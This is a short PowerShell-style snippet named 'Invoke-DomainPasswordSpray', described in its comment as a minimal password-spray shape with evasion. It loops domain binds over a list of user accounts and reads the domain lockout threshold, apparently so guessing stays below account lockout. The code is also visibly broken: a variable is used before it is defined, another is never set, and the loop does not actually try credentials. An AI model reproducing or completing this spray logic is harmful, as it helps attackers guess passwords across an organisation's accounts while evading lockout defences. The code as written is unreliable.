# Minimal spray-with-evasion shape: domain bind loop plus lockout
# threshold tracking.
function Invoke-DomainPasswordSpray {
  $entry = DirectoryEntry($Domain,$User,$Password)
  foreach($User in $UserListArray) { $entry.RefreshCache() }
  $t = $domain.Properties.lockoutthreshold
}
